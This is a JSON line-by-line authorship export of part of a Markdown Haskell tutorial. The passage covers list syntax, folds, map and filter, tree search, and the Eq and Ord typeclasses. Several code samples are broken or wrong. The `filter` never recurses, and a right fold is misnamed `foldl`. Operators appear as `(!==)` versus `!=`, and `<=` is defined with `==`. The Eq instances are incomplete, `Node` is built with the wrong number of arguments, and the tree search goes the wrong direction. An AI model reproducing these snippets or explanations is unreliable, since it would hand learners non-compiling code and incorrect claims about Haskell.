          "gitId": "-"
        },
        "content": "    xs \u003d 2:(4:(6:(8:[])))"
      },
      {
        "lineNumber": 587,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 588,
        "author": {
          "gitId": "-"
        },
        "content": "    -- taking advantage of binding rules for (:), noiseless and easier to understand at a glance"
      },
      {
        "lineNumber": 589,
        "author": {
          "gitId": "-"
        },
        "content": "    xs \u003d 2:4:6:8:[]"
      },
      {
        "lineNumber": 590,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 591,
        "author": {
          "gitId": "-"
        },
        "content": "    -- using varying amounts of list syntactic sugar provided by the compiler"
      },
      {
        "lineNumber": 592,
        "author": {
          "gitId": "-"
        },
        "content": "    xs \u003d 2:4:6:[8]"
      },
      {
        "lineNumber": 593,
        "author": {
          "gitId": "-"
        },
        "content": "    xs \u003d 2:4:[6,8]"
      },
      {
        "lineNumber": 594,
        "author": {
          "gitId": "-"
        },
        "content": "    xs \u003d 2:[4,6,8]"
      },
      {
        "lineNumber": 595,
        "author": {
          "gitId": "-"
        },
        "content": "    xs \u003d [2,4,6,8]"
      },
      {
        "lineNumber": 596,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 597,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 598,
        "author": {
          "gitId": "-"
        },
        "content": "The last representation is most commonly used, while the second last is often"
      },
      {
        "lineNumber": 599,
        "author": {
          "gitId": "-"
        },
        "content": "used when pattern matching on lists. The rest are almost never seen in practice."
      },
      {
        "lineNumber": 600,
        "author": {
          "gitId": "-"
        },
        "content": "However, it is hoped that this pedantic exercise helps the reader understand"
      },
      {
        "lineNumber": 601,
        "author": {
          "gitId": "-"
        },
        "content": "the true nature of lists: an ordinary inductive data type with some compiler"
      },
      {
        "lineNumber": 602,
        "author": {
          "gitId": "-"
        },
        "content": "syntactic sugar tacked on."
      },
      {
        "lineNumber": 603,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 604,
        "author": {
          "gitId": "-"
        },
        "content": "### List Processing - Fold"
      },
      {
        "lineNumber": 605,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 606,
        "author": {
          "gitId": "-"
        },
        "content": "List processing is a very important part of elementary functional programming."
      },
      {
        "lineNumber": 607,
        "author": {
          "gitId": "-"
        },
        "content": "This is due to the fact that lists can store large amounts of data, and it is"
      },
      {
        "lineNumber": 608,
        "author": {
          "gitId": "-"
        },
        "content": "very easy to define powerful abstractions to slice and dice that data in ways"
      },
      {
        "lineNumber": 609,
        "author": {
          "gitId": "-"
        },
        "content": "typically unknown in imperative programming."
      },
      {
        "lineNumber": 610,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 611,
        "author": {
          "gitId": "-"
        },
        "content": "One common idiom is to loop over a list and aggregate their values."
      },
      {
        "lineNumber": 612,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 613,
        "author": {
          "gitId": "-"
        },
        "content": "It is possible to run over a list and sum their values recursively like so:"
      },
      {
        "lineNumber": 614,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 615,
        "author": {
          "gitId": "-"
        },
        "content": "```haskell"
      },
      {
        "lineNumber": 616,
        "author": {
          "gitId": "-"
        },
        "content": "    sumList :: [Int] -\u003e Int"
      },
      {
        "lineNumber": 617,
        "author": {
          "gitId": "-"
        },
        "content": "    sumList [] \u003d 0"
      },
      {
        "lineNumber": 618,
        "author": {
          "gitId": "-"
        },
        "content": "    sumList (x:xs) \u003d x + sumList xs"
      },
      {
        "lineNumber": 619,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 620,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 621,
        "author": {
          "gitId": "-"
        },
        "content": "Note the infix pattern match `(x:xs)` as opposed to `((:) x xs)`. What if we wish"
      },
      {
        "lineNumber": 622,
        "author": {
          "gitId": "-"
        },
        "content": "to take the product of the elements instead of a sum? Then we would write:"
      },
      {
        "lineNumber": 623,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 624,
        "author": {
          "gitId": "-"
        },
        "content": "```haskell"
      },
      {
        "lineNumber": 625,
        "author": {
          "gitId": "-"
        },
        "content": "    prodList :: [Int] -\u003e Int"
      },
      {
        "lineNumber": 626,
        "author": {
          "gitId": "-"
        },
        "content": "    prodList [] \u003d 1"
      },
      {
        "lineNumber": 627,
        "author": {
          "gitId": "-"
        },
        "content": "    prodList (x:xs) \u003d x * prodList xs"
      },
      {
        "lineNumber": 628,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 629,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 630,
        "author": {
          "gitId": "-"
        },
        "content": "It is clear that some abstraction is in order here. The functions are almost"
      },
      {
        "lineNumber": 631,
        "author": {
          "gitId": "-"
        },
        "content": "identical except for the aggregating function used and the initial value (0 for"
      },
      {
        "lineNumber": 632,
        "author": {
          "gitId": "-"
        },
        "content": "sum, 1 for product). We can write a generalised aggregating function:"
      },
      {
        "lineNumber": 633,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 634,
        "author": {
          "gitId": "-"
        },
        "content": "```haskell"
      },
      {
        "lineNumber": 635,
        "author": {
          "gitId": "-"
        },
        "content": "    -- 1st parameter is the aggregating function (e.g. (+) or (*))"
      },
      {
        "lineNumber": 636,
        "author": {
          "gitId": "-"
        },
        "content": "    -- 2nd parameter is the initial value"
      },
      {
        "lineNumber": 637,
        "author": {
          "gitId": "-"
        },
        "content": "    -- 3rd parameter is the list to aggregate"
      },
      {
        "lineNumber": 638,
        "author": {
          "gitId": "-"
        },
        "content": "    aggregate :: (Int -\u003e Int -\u003e Int) -\u003e Int -\u003e [Int] -\u003e Int"
      },
      {
        "lineNumber": 639,
        "author": {
          "gitId": "-"
        },
        "content": "    aggregate _ initial [] \u003d initial"
      },
      {
        "lineNumber": 640,
        "author": {
          "gitId": "-"
        },
        "content": "    aggregate op initial (x:xs) \u003d op x (aggregate op initial xs)"
      },
      {
        "lineNumber": 641,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 642,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 643,
        "author": {
          "gitId": "-"
        },
        "content": "This is better, but perhaps we could generalise this even further beyond `Int`."
      },
      {
        "lineNumber": 644,
        "author": {
          "gitId": "-"
        },
        "content": "We then arrive at the following, by simply changing the type signature:"
      },
      {
        "lineNumber": 645,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 646,
        "author": {
          "gitId": "-"
        },
        "content": "```haskell"
      },
      {
        "lineNumber": 647,
        "author": {
          "gitId": "-"
        },
        "content": "    -- 1st parameter is the aggregating function (e.g. (+) or (*))"
      },
      {
        "lineNumber": 648,
        "author": {
          "gitId": "-"
        },
        "content": "    -- 2nd parameter is the initial value"
      },
      {
        "lineNumber": 649,
        "author": {
          "gitId": "-"
        },
        "content": "    -- 3rd parameter is the list to aggregate"
      },
      {
        "lineNumber": 650,
        "author": {
          "gitId": "-"
        },
        "content": "    aggregate :: (a -\u003e b -\u003e b) -\u003e b -\u003e [a] -\u003e b"
      },
      {
        "lineNumber": 651,
        "author": {
          "gitId": "-"
        },
        "content": "    aggregate _ initial [] \u003d initial"
      },
      {
        "lineNumber": 652,
        "author": {
          "gitId": "-"
        },
        "content": "    aggregate op initial (x:xs) \u003d op x (aggregate op initial xs)"
      },
      {
        "lineNumber": 653,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 654,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 655,
        "author": {
          "gitId": "-"
        },
        "content": "This function is known as `foldl` in the Haskell prelude library, and there is"
      },
      {
        "lineNumber": 656,
        "author": {
          "gitId": "-"
        },
        "content": "also a variant called `foldr` that does the aggregation from the right instead."
      },
      {
        "lineNumber": 657,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 658,
        "author": {
          "gitId": "-"
        },
        "content": "### List Processing - Map \u0026 Filter"
      },
      {
        "lineNumber": 659,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 660,
        "author": {
          "gitId": "-"
        },
        "content": "One may wish to take in a list, transform every element in the list, and output"
      },
      {
        "lineNumber": 661,
        "author": {
          "gitId": "-"
        },
        "content": "the resulting list. This is known as a map, and may be defined as:"
      },
      {
        "lineNumber": 662,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 663,
        "author": {
          "gitId": "-"
        },
        "content": "```haskell"
      },
      {
        "lineNumber": 664,
        "author": {
          "gitId": "-"
        },
        "content": "    map :: (a -\u003e b) -\u003e [a] -\u003e [b]"
      },
      {
        "lineNumber": 665,
        "author": {
          "gitId": "-"
        },
        "content": "    map _ [] \u003d []"
      },
      {
        "lineNumber": 666,
        "author": {
          "gitId": "-"
        },
        "content": "    map f (x:xs) \u003d (f x):(map f xs)"
      },
      {
        "lineNumber": 667,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 668,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 669,
        "author": {
          "gitId": "-"
        },
        "content": "The type definition itself contains a wealth of information. The `map` function"
      },
      {
        "lineNumber": 670,
        "author": {
          "gitId": "-"
        },
        "content": "takes in a \"transformer\", the list to be transformed, and return the transformed"
      },
      {
        "lineNumber": 671,
        "author": {
          "gitId": "-"
        },
        "content": "list. An example of its usage would be:"
      },
      {
        "lineNumber": 672,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 673,
        "author": {
          "gitId": "-"
        },
        "content": "```haskell"
      },
      {
        "lineNumber": 674,
        "author": {
          "gitId": "-"
        },
        "content": "    -- xs is [1,4,9,16]"
      },
      {
        "lineNumber": 675,
        "author": {
          "gitId": "-"
        },
        "content": "    xs \u003d map (\\x -\u003e x * x) [1,2,3,4]"
      },
      {
        "lineNumber": 676,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 677,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 678,
        "author": {
          "gitId": "-"
        },
        "content": "One may also wish to remove certain elements, that fail some predicate, from a"
      },
      {
        "lineNumber": 679,
        "author": {
          "gitId": "-"
        },
        "content": "given list. This is known as a filter:"
      },
      {
        "lineNumber": 680,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 681,
        "author": {
          "gitId": "-"
        },
        "content": "```haskell"
      },
      {
        "lineNumber": 682,
        "author": {
          "gitId": "-"
        },
        "content": "    filter :: (t -\u003e Bool) -\u003e [t] -\u003e [t]"
      },
      {
        "lineNumber": 683,
        "author": {
          "gitId": "-"
        },
        "content": "    filter _ [] \u003d []"
      },
      {
        "lineNumber": 684,
        "author": {
          "gitId": "-"
        },
        "content": "    filter predicate (x:xs)"
      },
      {
        "lineNumber": 685,
        "author": {
          "gitId": "-"
        },
        "content": "        | predicate x \u003d\u003d True \u003d x:xs"
      },
      {
        "lineNumber": 686,
        "author": {
          "gitId": "-"
        },
        "content": "        | otherwise \u003d xs"
      },
      {
        "lineNumber": 687,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 688,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 689,
        "author": {
          "gitId": "-"
        },
        "content": "This example uses guard patterns. An example of using filter would be:"
      },
      {
        "lineNumber": 690,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 691,
        "author": {
          "gitId": "-"
        },
        "content": "```haskell"
      },
      {
        "lineNumber": 692,
        "author": {
          "gitId": "-"
        },
        "content": "    -- xs is [2,4]"
      },
      {
        "lineNumber": 693,
        "author": {
          "gitId": "-"
        },
        "content": "    xs \u003d filter (\\x -\u003e x `mod` 2 \u003d\u003d 0) [1,2,3,4]"
      },
      {
        "lineNumber": 694,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 695,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 696,
        "author": {
          "gitId": "-"
        },
        "content": "It is left as an exercise for the reader to implement `map` and `filter`"
      },
      {
        "lineNumber": 697,
        "author": {
          "gitId": "-"
        },
        "content": "in terms of `foldl` (or `aggregate` as defined above, which is the same)."
      },
      {
        "lineNumber": 698,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 699,
        "author": {
          "gitId": "-"
        },
        "content": "### Programming with Other Inductive Data Types"
      },
      {
        "lineNumber": 700,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 701,
        "author": {
          "gitId": "-"
        },
        "content": "Recursion is a natural fit with inductive data types other than lists. One"
      },
      {
        "lineNumber": 702,
        "author": {
          "gitId": "-"
        },
        "content": "example would be finding an element in a binary tree:"
      },
      {
        "lineNumber": 703,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 704,
        "author": {
          "gitId": "-"
        },
        "content": "```haskell"
      },
      {
        "lineNumber": 705,
        "author": {
          "gitId": "-"
        },
        "content": "    find :: Tree Int -\u003e Int -\u003e Bool"
      },
      {
        "lineNumber": 706,
        "author": {
          "gitId": "-"
        },
        "content": "    find EmptyTree _ \u003d False"
      },
      {
        "lineNumber": 707,
        "author": {
          "gitId": "-"
        },
        "content": "    find (Node x left right) target"
      },
      {
        "lineNumber": 708,
        "author": {
          "gitId": "-"
        },
        "content": "        | x \u003d\u003d target \u003d True"
      },
      {
        "lineNumber": 709,
        "author": {
          "gitId": "-"
        },
        "content": "        | x \u003c target \u003d find left target"
      },
      {
        "lineNumber": 710,
        "author": {
          "gitId": "-"
        },
        "content": "        | x \u003e target \u003d find right target"
      },
      {
        "lineNumber": 711,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 712,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 713,
        "author": {
          "gitId": "-"
        },
        "content": "The above runs in O(log n) as long as the tree is balanced."
      },
      {
        "lineNumber": 714,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 715,
        "author": {
          "gitId": "-"
        },
        "content": "### Further Reading"
      },
      {
        "lineNumber": 716,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 717,
        "author": {
          "gitId": "-"
        },
        "content": "* [Function Syntax](http://learnyouahaskell.com/syntax-in-functions)"
      },
      {
        "lineNumber": 718,
        "author": {
          "gitId": "-"
        },
        "content": "* [Higher-Order Functions](http://learnyouahaskell.com/higher-order-functions)"
      },
      {
        "lineNumber": 719,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 720,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 721,
        "author": {
          "gitId": "-"
        },
        "content": "## Typeclasses"
      },
      {
        "lineNumber": 722,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 723,
        "author": {
          "gitId": "-"
        },
        "content": "Typeclasses are essentially contracts/constraints imposed on types. They are"
      },
      {
        "lineNumber": 724,
        "author": {
          "gitId": "-"
        },
        "content": "similar to how Java interfaces are constraints imposed on Java classes. When"
      },
      {
        "lineNumber": 725,
        "author": {
          "gitId": "-"
        },
        "content": "used properly, they are an extremely powerful tool in helping to structure code."
      },
      {
        "lineNumber": 726,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 727,
        "author": {
          "gitId": "-"
        },
        "content": "### Defining and Instantiating Typeclasses"
      },
      {
        "lineNumber": 728,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 729,
        "author": {
          "gitId": "-"
        },
        "content": "```haskell"
      },
      {
        "lineNumber": 730,
        "author": {
          "gitId": "-"
        },
        "content": "    -- \"class\" here has nothing to do with OOP"
      },
      {
        "lineNumber": 731,
        "author": {
          "gitId": "-"
        },
        "content": "    class Eq t where"
      },
      {
        "lineNumber": 732,
        "author": {
          "gitId": "-"
        },
        "content": "        (\u003d\u003d) :: t -\u003e t -\u003e Bool"
      },
      {
        "lineNumber": 733,
        "author": {
          "gitId": "-"
        },
        "content": "        (!\u003d\u003d) :: t -\u003e t -\u003e Bool"
      },
      {
        "lineNumber": 734,
        "author": {
          "gitId": "-"
        },
        "content": "        -- this ensures that we don\u0027t have to define (!\u003d\u003d) separately"
      },
      {
        "lineNumber": 735,
        "author": {
          "gitId": "-"
        },
        "content": "        a !\u003d b \u003d not (a \u003d\u003d b)"
      },
      {
        "lineNumber": 736,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 737,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 738,
        "author": {
          "gitId": "-"
        },
        "content": "We have just defined a typeclass called `Eq`. As its name probably suggests,"
      },
      {
        "lineNumber": 739,
        "author": {
          "gitId": "-"
        },
        "content": "this typeclass is used when we wish to define the meaning of equality on types."
      },
      {
        "lineNumber": 740,
        "author": {
          "gitId": "-"
        },
        "content": "We then _instantiate_ the typeclass with the `TrafficSignal` type, like so:"
      },
      {
        "lineNumber": 741,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 742,
        "author": {
          "gitId": "-"
        },
        "content": "```haskell"
      },
      {
        "lineNumber": 743,
        "author": {
          "gitId": "-"
        },
        "content": "    instance Eq TrafficSignal where"
      },
      {
        "lineNumber": 744,
        "author": {
          "gitId": "-"
        },
        "content": "        -- note that these are infix function DEFINITIONS"
      },
      {
        "lineNumber": 745,
        "author": {
          "gitId": "-"
        },
        "content": "        -- we can define infix operators directly in infix notation"
      },
      {
        "lineNumber": 746,
        "author": {
          "gitId": "-"
        },
        "content": "        Red \u003d\u003d Red"
      },
      {
        "lineNumber": 747,
        "author": {
          "gitId": "-"
        },
        "content": "        Amber \u003d\u003d Amber"
      },
      {
        "lineNumber": 748,
        "author": {
          "gitId": "-"
        },
        "content": "        Green \u003d\u003d Green"
      },
      {
        "lineNumber": 749,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 750,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 751,
        "author": {
          "gitId": "-"
        },
        "content": "We have thus defined `(\u003d\u003d)` completely for `TrafficSignal`. Note that `(!\u003d)`"
      },
      {
        "lineNumber": 752,
        "author": {
          "gitId": "-"
        },
        "content": "now comes for free, since we have defined it in terms of `(\u003d\u003d)` in the typeclass"
      },
      {
        "lineNumber": 753,
        "author": {
          "gitId": "-"
        },
        "content": "itself."
      },
      {
        "lineNumber": 754,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 755,
        "author": {
          "gitId": "-"
        },
        "content": "Here\u0027s another example:"
      },
      {
        "lineNumber": 756,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 757,
        "author": {
          "gitId": "-"
        },
        "content": "```haskell"
      },
      {
        "lineNumber": 758,
        "author": {
          "gitId": "-"
        },
        "content": "    instance Eq (List t) where"
      },
      {
        "lineNumber": 759,
        "author": {
          "gitId": "-"
        },
        "content": "        EmptyList \u003d\u003d EmptyList"
      },
      {
        "lineNumber": 760,
        "author": {
          "gitId": "-"
        },
        "content": "        (Element x xs) \u003d\u003d (Element y ys) \u003d (x \u003d\u003d y) \u0026\u0026 (xs \u003d\u003d ys)"
      },
      {
        "lineNumber": 761,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 762,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 763,
        "author": {
          "gitId": "-"
        },
        "content": "Here, we define the equality of a list in terms of its underlying elements."
      },
      {
        "lineNumber": 764,
        "author": {
          "gitId": "-"
        },
        "content": "This seems reasonable. However, running this program will give an error. This"
      },
      {
        "lineNumber": 765,
        "author": {
          "gitId": "-"
        },
        "content": "is because we are attempting to compare the underlying elements (of type `t`)"
      },
      {
        "lineNumber": 766,
        "author": {
          "gitId": "-"
        },
        "content": "using `(\u003d\u003d)`, which is not guaranteed to be defined on `t`."
      },
      {
        "lineNumber": 767,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 768,
        "author": {
          "gitId": "-"
        },
        "content": "The solution, in this case, is to enforce a typeclass constraint prerequisite"
      },
      {
        "lineNumber": 769,
        "author": {
          "gitId": "-"
        },
        "content": "on `t` by writing:"
      },
      {
        "lineNumber": 770,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 771,
        "author": {
          "gitId": "-"
        },
        "content": "```haskell"
      },
      {
        "lineNumber": 772,
        "author": {
          "gitId": "-"
        },
        "content": "    instance (Eq t) \u003d\u003e Eq (List t) where"
      },
      {
        "lineNumber": 773,
        "author": {
          "gitId": "-"
        },
        "content": "        -- as before"
      },
      {
        "lineNumber": 774,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 775,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 776,
        "author": {
          "gitId": "-"
        },
        "content": "Here is an example of `Eq` being defined on `Tree`s:"
      },
      {
        "lineNumber": 777,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 778,
        "author": {
          "gitId": "-"
        },
        "content": "```haskell"
      },
      {
        "lineNumber": 779,
        "author": {
          "gitId": "-"
        },
        "content": "    instance (Eq t) \u003d\u003e Eq (Tree t) where"
      },
      {
        "lineNumber": 780,
        "author": {
          "gitId": "-"
        },
        "content": "        EmptyTree \u003d\u003d EmptyTree"
      },
      {
        "lineNumber": 781,
        "author": {
          "gitId": "-"
        },
        "content": "        (Node x left right) \u003d\u003d (Node x\u0027 left\u0027 right\u0027) \u003d (x \u003d\u003d x\u0027) \u0026\u0026 (left \u003d\u003d left\u0027) \u0026\u0026 (right \u003d\u003d right\u0027)"
      },
      {
        "lineNumber": 782,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 783,
        "author": {
          "gitId": "-"
        },
        "content": "    tree1 \u003d Node 1 (Node 2 EmptyTree) (Node 3 EmptyTree)"
      },
      {
        "lineNumber": 784,
        "author": {
          "gitId": "-"
        },
        "content": "    tree2 \u003d Node 1 (Node 2 EmptyTree) EmptyTree"
      },
      {
        "lineNumber": 785,
        "author": {
          "gitId": "-"
        },
        "content": "    tree3 \u003d Node 1 (Node 2 EmptyTree) EmptyTree"
      },
      {
        "lineNumber": 786,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 787,
        "author": {
          "gitId": "-"
        },
        "content": "    -- some experiments"
      },
      {
        "lineNumber": 788,
        "author": {
          "gitId": "-"
        },
        "content": "    tree1 \u003d\u003d tree2 -- False"
      },
      {
        "lineNumber": 789,
        "author": {
          "gitId": "-"
        },
        "content": "    tree2 \u003d\u003d tree3 -- True"
      },
      {
        "lineNumber": 790,
        "author": {
          "gitId": "-"
        },
        "content": "    tree3 !\u003d tree1 -- True"
      },
      {
        "lineNumber": 791,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 792,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 793,
        "author": {
          "gitId": "-"
        },
        "content": "We present another common typeclass called `Ord`, which defines order for a type:"
      },
      {
        "lineNumber": 794,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 795,
        "author": {
          "gitId": "-"
        },
        "content": "```haskell"
      },
      {
        "lineNumber": 796,
        "author": {
          "gitId": "-"
        },
        "content": "    -- anything that instantiates Ord must also instantiate Eq"
      },
      {
        "lineNumber": 797,
        "author": {
          "gitId": "-"
        },
        "content": "    -- this makes the typeclass definitions simpler as (\u003d\u003d) is already provided and can be used"
      },
      {
        "lineNumber": 798,
        "author": {
          "gitId": "-"
        },
        "content": "    class (Eq t) \u003d\u003e Ord t where"
      },
      {
        "lineNumber": 799,
        "author": {
          "gitId": "-"
        },
        "content": "        -- the only one we actually need to implement when instantiating"
      },
      {
        "lineNumber": 800,
        "author": {
          "gitId": "-"
        },
        "content": "        (\u003c) :: t -\u003e t -\u003e Bool"
      },
      {
        "lineNumber": 801,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 802,
        "author": {
          "gitId": "-"
        },
        "content": "        -- we predefine these and can then get them all for free"
      },
      {
        "lineNumber": 803,
        "author": {
          "gitId": "-"
        },
        "content": "        (\u003e) :: t -\u003e t -\u003e Bool"
      },
      {
        "lineNumber": 804,
        "author": {
          "gitId": "-"
        },
        "content": "        a \u003e b \u003d not ((a \u003c b) || (a \u003d\u003d b))"
      },
      {
        "lineNumber": 805,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 806,
        "author": {
          "gitId": "-"
        },
        "content": "        (\u003c\u003d) :: t -\u003e t -\u003e Bool"
      },
      {
        "lineNumber": 807,
        "author": {
          "gitId": "-"
        },
        "content": "        a \u003c\u003d b \u003d\u003d (a \u003c b) || (a \u003d\u003d b)"
      },
      {
        "lineNumber": 808,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 809,
        "author": {
          "gitId": "-"
        },
        "content": "        (\u003e\u003d) :: t -\u003e t -\u003e Bool"
      },
      {
        "lineNumber": 810,
        "author": {
          "gitId": "-"
        },
        "content": "        a \u003e\u003d b \u003d not (a \u003c b)"
      },
      {
        "lineNumber": 811,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 812,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 813,
        "author": {
          "gitId": "-"
        },
        "content": "### Adding Typeclass Constraints to Functions"
      },
      {
        "lineNumber": 814,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 815,
        "author": {
          "gitId": "-"
        },
        "content": "Consider the following function to check if the elements in the following list"
      },
      {
        "lineNumber": 816,
        "author": {
          "gitId": "-"
        },
        "content": "are all in ascending order:"
      },
      {
        "lineNumber": 817,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 818,
        "author": {
          "gitId": "-"
        },
        "content": "```haskell"
      },
      {
        "lineNumber": 819,
        "author": {
          "gitId": "-"
        },
        "content": "    isAscending :: [t] -\u003e Bool"
      },
      {
        "lineNumber": 820,
        "author": {
          "gitId": "-"
        },
        "content": "    isAscending [] \u003d True -- handle 0-element lists"
      },
      {
        "lineNumber": 821,
        "author": {
          "gitId": "-"
        },
        "content": "    isAscending (x:[]) \u003d True -- handle 1-element lists"
      },
      {
        "lineNumber": 822,
        "author": {
          "gitId": "-"
        },
        "content": "    isAscending (x:y:xs) \u003d (x \u003c y) \u0026\u0026 isAscending (y:xs) -- recursive case"
      },
      {
        "lineNumber": 823,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 824,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 825,
        "author": {
          "gitId": "-"
        },
        "content": "This function seems reasonable, except for one minor detail: we (and the compiler)"
      },
      {
        "lineNumber": 826,
        "author": {
          "gitId": "-"
        },
        "content": "are not sure if `t` can be compared using `(\u003c)`!. To remedy this, we need to"
      },
      {
        "lineNumber": 827,
        "author": {
          "gitId": "-"
        },
        "content": "explicitly state that `t` instantiates `Ord`, thereby allowing the use of `(\u003c)`."
      },
      {
        "lineNumber": 828,
        "author": {
          "gitId": "-"
        },
        "content": "We do this by adding the constraint in the function type definition:"
      },
      {
        "lineNumber": 829,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 830,
        "author": {
          "gitId": "-"
        },
        "content": "```haskell"
      },
      {
        "lineNumber": 831,
        "author": {
          "gitId": "-"
        },
        "content": "    isAscending :: (Ord t) \u003d\u003e [t] -\u003e Bool"
      },
      {
        "lineNumber": 832,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 833,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 834,
        "author": {
          "gitId": "-"
        },
        "content": "We can now try out the `isAscending` function:"
      },
      {
        "lineNumber": 835,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 836,
        "author": {
          "gitId": "-"
        },
        "content": "```haskell"
      },
      {
        "lineNumber": 837,
        "author": {
          "gitId": "-"
        },
        "content": "    isAscending [1,2,4,3] -- False"
      },
      {
        "lineNumber": 838,
        "author": {
          "gitId": "-"
        },
        "content": "    isAscending [1,2,3,4,5] -- True"
      },
      {
        "lineNumber": 839,
        "author": {
          "gitId": "-"
        },
        "content": "    isAscending [] -- True"
      },
      {
        "lineNumber": 840,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 841,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 842,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "### Instantiating Typeclasses With Parameterized Type Constructors"
      },
      {
        "lineNumber": 843,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 844,
        "author": {
          "gitId": "-"
        },
